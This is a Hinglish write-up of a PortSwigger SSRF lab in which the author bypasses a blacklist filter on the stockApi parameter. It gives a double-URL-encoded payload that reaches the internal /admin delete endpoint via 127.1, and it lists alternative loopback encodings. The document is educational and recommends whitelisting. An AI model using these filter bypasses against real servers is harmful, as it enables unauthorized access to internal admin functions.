// PortSwigger Labs ---> Platform
---
## Lab: 4 — SSRF With Blacklist-Based Input Filter
## Difficulty Level : 🟡 PRACTITIONER

---

### Where I Found Vulnerability ?
- **URL:** `/product?productId=3`
- **Parameter:** `stockApi`
- **Defense:** Developer ne 2 weak anti-SSRF filters lagaye the — dono bypass ho gaye

---

### Steps ?
1. Check Stock button click karo aur Burp mein intercept karo
2. `stockApi` parameter ki value change karo
3. Direct payloads blocked the — filter bypass karna pada
4. `127.0.0.1` → `127.1` se bypass kiya (Filter 1 down ✅)
5. `admin` word blocked tha → double URL encode kiya (Filter 2 down ✅)
6. Final payload send kiya → `/admin` panel open
7. Carlos delete kiya → Lab solved ✅

---

### Working Payloads ?

**Blocked (Developer ne ye sab block kiye the):**
```
http://localhost/admin       ← "localhost" blocked
http://127.0.0.1/admin      ← "127.0.0.1" blocked
http://127.1/admin           ← "admin" word blocked
```

**Final Working Payload (Double Encoding):**
```
stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos
```

**Decode breakdown:**
```
%25%36%31 = %61 = a
%25%36%34 = %64 = d
%25%36%64 = %6d = m
%25%36%39 = %69 = i
%25%36%65 = %6e = n
────────────────────
Result     → admin
```

---

### Why it Worked ?

**Filter 1 — IP Bypass:**
- Developer ne `localhost` aur `127.0.0.1` block kiya tha
- Lekin `127.1` bhi same address hai — short form hai jisko filter ne nahi pakda
- OS automatically `127.1` → `127.0.0.1` resolve karta hai

**Filter 2 — Double Encoding Bypass:**
- Developer ne `admin` word block kiya tha
- Single encode: `admin` → `%61%64%6d%69%6e` → Filter ne ise decode karke pakda ❌
- Double encode: `admin` → `%2561%2564%256d%2569%256e` → Filter dhoka kha gaya ✅
- Server ne request process karte waqt khud decode kiya → `admin` ban gaya

```
Normal Encode  :  admin → %61%64%6d%69%6e  (Filter catches this)
Double Encode  :  admin → %2561%2564...    (Filter misses this)
                                ↓
                  Server decodes → %61%64... → admin ✅
```

---

### What I Learned ?

- **Blacklist = Weak Defense** — Attackers hamesha blacklist bypass kar lete hain
- `127.0.0.1` ke alternatives jo filter miss karte hain:
```
127.1
127.0.1
0x7f000001      ← Hex
2130706433      ← Decimal
0177.0.0.1      ← Octal
[::1]           ← IPv6
```
- **Double URL Encoding** ek powerful bypass technique hai jab server input ko 2 baar decode karta hai
- Developer ko blacklist ki jagah **whitelist** use karni chahiye — allowed domains hi allow karo, baki sab block

---

### Blacklist vs Whitelist — Key Difference

| | Blacklist | Whitelist |
|--|-----------|-----------|
| Approach | Known bad ko block karo | Sirf allowed ko allow karo |
| Bypassable? | ✅ Almost always | ❌ Very hard |
| Example | Block "localhost", "127.0.0.1" | Allow only "api.example.com" |
| Used in this lab? | ✅ Yes (and bypassed) | ❌ No |

